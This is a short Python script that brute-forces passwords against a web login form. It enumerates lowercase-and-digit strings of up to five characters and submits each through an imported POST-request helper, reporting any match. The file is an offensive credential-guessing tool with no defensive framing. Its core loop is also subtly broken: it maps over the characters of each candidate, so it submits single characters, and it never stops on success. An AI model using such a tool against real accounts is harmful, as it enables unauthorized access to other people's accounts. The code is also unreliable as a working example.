import string
from SendPostForm import PostRequest, Session
from itertools import chain, product
from queue import Queue
from threading import Thread
from multiprocessing import Process
from concurrent.futures import ProcessPoolExecutor

q = Queue()


printable = list(string.ascii_lowercase) + list(string.digits)
# special_c = list(string.punctuation)


def bruteforce(password):

    SessionData = Session()

    if PostRequest(SessionData, password):
        print("Password found!: "+password)
    else:
        print("Failed using: "+password)

if __name__ == '__main__':

    with ProcessPoolExecutor() as executor:

        for candidate in chain.from_iterable(product(printable, repeat = i) for i in range(1, 6)):
            pswd = "".join(candidate)
            executor.map(bruteforce, pswd)

        for candidate in chain.from_iterable(product(list(reversed(printable)), repeat = i) for i in range(1, 6)):
            pswd = "".join(candidate)
            executor.map(bruteforce, pswd)